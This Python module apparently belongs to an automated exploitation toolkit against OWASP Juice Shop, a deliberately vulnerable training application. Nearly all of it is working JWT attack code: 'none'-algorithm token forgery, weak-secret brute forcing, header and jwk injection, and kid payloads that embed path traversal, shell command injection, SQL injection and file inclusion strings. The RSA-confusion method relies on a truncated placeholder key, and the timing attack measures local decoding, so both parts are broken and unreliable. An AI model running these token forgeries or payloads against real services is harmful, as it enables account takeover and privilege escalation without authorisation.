import logging
try:
    import jwt as pyjwt
except ImportError:
    pyjwt = None
import base64
import json
import time
from typing import Dict, List, Any, Optional
from core.api_client import JuiceShopAPI
from core.browser_automation import BrowserAutomation


class TokenManipulationExploits:
    """
    JWT Token Manipulation Exploits für OWASP Juice Shop
    """
    
    def __init__(self, api: JuiceShopAPI, browser: Optional[BrowserAutomation] = None):
        self.api = api
        self.browser = browser
        self.logger = logging.getLogger(__name__)
        
    def exploit_jwt_none_algorithm(self) -> Dict[str, Any]:
        """
        Challenge: JWT Algorithm Confusion - None Algorithm
        """
        self.logger.info("Exploiting: JWT None Algorithm Attack")
        
        try:
            # First get a valid token
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                login_result = self.api.login("admin@juice-sh.op", "admin123")
                
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'JWT None Algorithm', 'error': 'Could not get valid token'}
                
            original_token = login_result['authentication']['token']
            
            # Decode the token without verification
            try:
                decoded_token = pyjwt.decode(original_token, options={"verify_signature": False})
                header = pyjwt.get_unverified_header(original_token)
                
                # Create malicious payload with admin privileges
                malicious_payload = decoded_token.copy()
                malicious_payload['data']['email'] = 'admin@juice-sh.op'
                malicious_payload['data']['id'] = 1
                if 'role' in malicious_payload['data']:
                    malicious_payload['data']['role'] = 'admin'
                else:
                    malicious_payload['data']['isAdmin'] = True
                    
                # Create new header with 'none' algorithm
                malicious_header = header.copy()
                malicious_header['alg'] = 'none'
                
                # Manually create the token (header.payload.)
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(malicious_header, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(malicious_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                # None algorithm token has empty signature
                malicious_token = f"{header_encoded}.{payload_encoded}."
                
                # Test the malicious token
                self.api.auth_token = malicious_token
                
                # Try to access admin resources
                whoami_result = self.api.whoami()
                if 'user' in whoami_result and (
                    'admin' in str(whoami_result).lower() or 
                    whoami_result.get('user', {}).get('email') == 'admin@juice-sh.op'
                ):
                    self.logger.info("JWT None algorithm attack successful")
                    return {
                        'success': True,
                        'challenge': 'JWT None Algorithm',
                        'original_token': original_token,
                        'malicious_token': malicious_token,
                        'admin_access': whoami_result
                    }
                    
            except Exception as e:
                self.logger.debug(f"JWT none algorithm manipulation failed: {e}")
                
        except Exception as e:
            self.logger.error(f"JWT none algorithm attack failed: {e}")
            
        return {'success': False, 'challenge': 'JWT None Algorithm'}
        
    def exploit_jwt_weak_secret(self) -> Dict[str, Any]:
        """
        Challenge: JWT Weak Secret / Brute Force
        """
        self.logger.info("Exploiting: JWT Weak Secret")
        
        try:
            # Get a valid token first
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'JWT Weak Secret', 'error': 'Could not get token'}
                
            original_token = login_result['authentication']['token']
            
            # Common weak secrets for JWT
            weak_secrets = [
                "secret",
                "password",
                "123456",
                "admin",
                "juice",
                "juiceshop",
                "key",
                "test",
                "default",
                "your-256-bit-secret",
                "supersecret",
                "mySecret",
                "",  # Empty secret
                "null",
                "undefined"
            ]
            
            # Try to crack the JWT secret
            for secret in weak_secrets:
                try:
                    # Try to decode with this secret
                    decoded = pyjwt.decode(original_token, secret, algorithms=["HS256"])
                    
                    # If successful, create admin token
                    admin_payload = decoded.copy()
                    admin_payload['data']['email'] = 'admin@juice-sh.op'
                    admin_payload['data']['id'] = 1
                    admin_payload['data']['isAdmin'] = True
                    
                    # Create new token with admin privileges
                    admin_token = pyjwt.encode(admin_payload, secret, algorithm="HS256")
                    
                    # Test the admin token
                    self.api.auth_token = admin_token
                    whoami_result = self.api.whoami()
                    
                    if 'user' in whoami_result and 'admin' in str(whoami_result).lower():
                        self.logger.info(f"JWT secret cracked: {secret}")
                        return {
                            'success': True,
                            'challenge': 'JWT Weak Secret',
                            'secret': secret,
                            'admin_token': admin_token,
                            'admin_access': whoami_result
                        }
                        
                except pyjwt.InvalidSignatureError:
                    continue
                except Exception as e:
                    self.logger.debug(f"JWT secret test failed for {secret}: {e}")
                    continue
                    
        except Exception as e:
            self.logger.error(f"JWT weak secret attack failed: {e}")
            
        return {'success': False, 'challenge': 'JWT Weak Secret'}
        
    def exploit_jwt_header_manipulation(self) -> Dict[str, Any]:
        """
        Challenge: JWT Header Manipulation
        """
        self.logger.info("Exploiting: JWT Header Manipulation")
        
        try:
            # Get valid token
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'JWT Header Manipulation', 'error': 'Could not get token'}
                
            original_token = login_result['authentication']['token']
            decoded_payload = pyjwt.decode(original_token, options={"verify_signature": False})
            
            # Header manipulation techniques
            manipulations = [
                # Algorithm confusion
                {"alg": "HS256", "typ": "JWT", "kid": "../../../etc/passwd"},
                {"alg": "none", "typ": "JWT"},
                {"alg": "RS256", "typ": "JWT"},  # Change to RSA
                
                # Key ID manipulation
                {"alg": "HS256", "typ": "JWT", "kid": "../../key.pem"},
                {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"},
                
                # JWK header injection
                {"alg": "HS256", "typ": "JWT", "jwk": {"kty": "oct", "k": "c2VjcmV0"}},  # base64("secret")
            ]
            
            for header_mod in manipulations:
                try:
                    # Create admin payload
                    admin_payload = decoded_payload.copy()
                    admin_payload['data']['email'] = 'admin@juice-sh.op'
                    admin_payload['data']['id'] = 1
                    
                    # Manually construct token with modified header
                    header_encoded = base64.urlsafe_b64encode(
                        json.dumps(header_mod, separators=(',', ':')).encode()
                    ).decode().rstrip('=')
                    
                    payload_encoded = base64.urlsafe_b64encode(
                        json.dumps(admin_payload, separators=(',', ':')).encode()
                    ).decode().rstrip('=')
                    
                    # Try different signature approaches
                    signatures = ["", "signature", "fake_signature"]
                    
                    for sig in signatures:
                        malicious_token = f"{header_encoded}.{payload_encoded}.{sig}"
                        
                        # Test token
                        self.api.auth_token = malicious_token
                        
                        try:
                            whoami_result = self.api.whoami()
                            if 'user' in whoami_result and 'admin' in str(whoami_result).lower():
                                self.logger.info(f"JWT header manipulation successful")
                                return {
                                    'success': True,
                                    'challenge': 'JWT Header Manipulation',
                                    'header_modification': header_mod,
                                    'malicious_token': malicious_token
                                }
                        except:
                            continue
                            
                except Exception as e:
                    self.logger.debug(f"Header manipulation failed: {header_mod}")
                    
        except Exception as e:
            self.logger.error(f"JWT header manipulation failed: {e}")
            
        return {'success': False, 'challenge': 'JWT Header Manipulation'}
        
    def exploit_jwt_kid_manipulation(self) -> Dict[str, Any]:
        """
        Challenge: JWT Key ID (kid) Parameter Exploitation
        """
        self.logger.info("Exploiting: JWT KID Parameter")
        
        try:
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'JWT KID Manipulation', 'error': 'Could not get token'}
                
            original_token = login_result['authentication']['token']
            decoded_payload = pyjwt.decode(original_token, options={"verify_signature": False})
            
            # KID parameter exploitation payloads
            kid_payloads = [
                # Path traversal
                "../../../etc/passwd",
                "../../key.pem",
                "../config/secret.key",
                
                # Command injection
                "key.pem; whoami",
                "key.pem | cat /etc/passwd",
                
                # SQL injection
                "' UNION SELECT 'secret' --",
                "1' OR '1'='1",
                
                # File inclusion
                "/dev/null",
                "/proc/version",
                "php://filter/convert.base64-encode/resource=config.php"
            ]
            
            for kid_payload in kid_payloads:
                try:
                    # Create malicious header with KID
                    malicious_header = {
                        "alg": "HS256",
                        "typ": "JWT",
                        "kid": kid_payload
                    }
                    
                    # Admin payload
                    admin_payload = decoded_payload.copy()
                    admin_payload['data']['email'] = 'admin@juice-sh.op'
                    admin_payload['data']['id'] = 1
                    
                    # Try with different secrets (in case kid points to predictable content)
                    test_secrets = ["", "null", "\x00", "secret", "admin"]
                    
                    for secret in test_secrets:
                        try:
                            malicious_token = pyjwt.encode(
                                admin_payload, 
                                secret, 
                                algorithm="HS256", 
                                headers=malicious_header
                            )
                            
                            # Test token
                            self.api.auth_token = malicious_token
                            whoami_result = self.api.whoami()
                            
                            if 'user' in whoami_result and 'admin' in str(whoami_result).lower():
                                self.logger.info(f"JWT KID manipulation successful: {kid_payload}")
                                return {
                                    'success': True,
                                    'challenge': 'JWT KID Manipulation',
                                    'kid_payload': kid_payload,
                                    'secret_used': secret,
                                    'malicious_token': malicious_token
                                }
                                
                        except Exception:
                            continue
                            
                except Exception as e:
                    self.logger.debug(f"KID payload failed: {kid_payload}")
                    
        except Exception as e:
            self.logger.error(f"JWT KID manipulation failed: {e}")
            
        return {'success': False, 'challenge': 'JWT KID Manipulation'}
        
    def exploit_jwt_confusion_rsa_hmac(self) -> Dict[str, Any]:
        """
        Challenge: JWT Algorithm Confusion (RSA to HMAC)
        """
        self.logger.info("Exploiting: JWT RSA to HMAC Algorithm Confusion")
        
        try:
            # This would require having access to the public key
            # For Juice Shop, we can try common public keys or generate one
            
            # Sample RSA public key (you would normally extract this from the application)
            sample_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2Z3QX0BTLS5UW4KpHvW+
k8REW5WIhGIVh8KTW0Zv8Z7XqFV2YWG...
-----END PUBLIC KEY-----"""
            
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'JWT Algorithm Confusion', 'error': 'Could not get token'}
                
            original_token = login_result['authentication']['token']
            decoded_payload = pyjwt.decode(original_token, options={"verify_signature": False})
            
            # Create admin payload
            admin_payload = decoded_payload.copy()
            admin_payload['data']['email'] = 'admin@juice-sh.op'
            admin_payload['data']['id'] = 1
            
            # Try to create HMAC token using RSA public key as secret
            try:
                # Change algorithm from RS256 to HS256 and use public key as secret
                confused_token = pyjwt.encode(
                    admin_payload,
                    sample_public_key,  # Use public key as HMAC secret
                    algorithm="HS256"
                )
                
                self.api.auth_token = confused_token
                whoami_result = self.api.whoami()
                
                if 'user' in whoami_result and 'admin' in str(whoami_result).lower():
                    self.logger.info("JWT algorithm confusion successful")
                    return {
                        'success': True,
                        'challenge': 'JWT Algorithm Confusion',
                        'confused_token': confused_token,
                        'technique': 'RSA to HMAC'
                    }
                    
            except Exception as e:
                self.logger.debug(f"Algorithm confusion failed: {e}")
                
        except Exception as e:
            self.logger.error(f"JWT algorithm confusion failed: {e}")
            
        return {'success': False, 'challenge': 'JWT Algorithm Confusion'}
        
    def exploit_jwt_timing_attack(self) -> Dict[str, Any]:
        """
        Challenge: JWT Timing Attack for Secret Discovery
        """
        self.logger.info("Exploiting: JWT Timing Attack")
        
        try:
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'JWT Timing Attack', 'error': 'Could not get token'}
                
            original_token = login_result['authentication']['token']
            
            # Perform timing attack to discover secret length/characters
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            discovered_secret = ""
            
            # Try to discover secret character by character
            for position in range(10):  # Limit to first 10 characters
                timing_results = []
                
                for char in charset[:10]:  # Limit charset for demo
                    test_secret = discovered_secret + char
                    
                    # Measure time to verify signature
                    start_time = time.time()
                    try:
                        pyjwt.decode(original_token, test_secret, algorithms=["HS256"])
                    except pyjwt.InvalidSignatureError:
                        pass
                    except Exception:
                        pass
                    end_time = time.time()
                    
                    timing_results.append({
                        'char': char,
                        'time': end_time - start_time
                    })
                    
                # Find character that took longest (indicating partial match)
                timing_results.sort(key=lambda x: x['time'], reverse=True)
                best_char = timing_results[0]['char']
                
                # If timing difference is significant, we might have found the character
                if timing_results[0]['time'] - timing_results[-1]['time'] > 0.001:
                    discovered_secret += best_char
                    self.logger.info(f"Discovered secret so far: {discovered_secret}")
                else:
                    break
                    
            if discovered_secret:
                self.logger.info(f"Timing attack discovered partial secret: {discovered_secret}")
                return {
                    'success': True,
                    'challenge': 'JWT Timing Attack',
                    'discovered_secret': discovered_secret
                }
                
        except Exception as e:
            self.logger.error(f"JWT timing attack failed: {e}")
            
        return {'success': False, 'challenge': 'JWT Timing Attack'}
        
    def run_all(self) -> List[Dict[str, Any]]:
        """Führt alle JWT Token Manipulation Exploits aus"""
        exploits = [
            self.exploit_jwt_none_algorithm,
            self.exploit_jwt_weak_secret,
            self.exploit_jwt_header_manipulation,
            self.exploit_jwt_kid_manipulation,
            self.exploit_jwt_confusion_rsa_hmac,
            self.exploit_jwt_timing_attack
        ]
        
        results = []
        for exploit in exploits:
            try:
                result = exploit()
                results.append(result)
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"JWT exploit failed: {e}")
                results.append({
                    'success': False,
                    'error': str(e),
                    'exploit': exploit.__name__
                })
                
        return results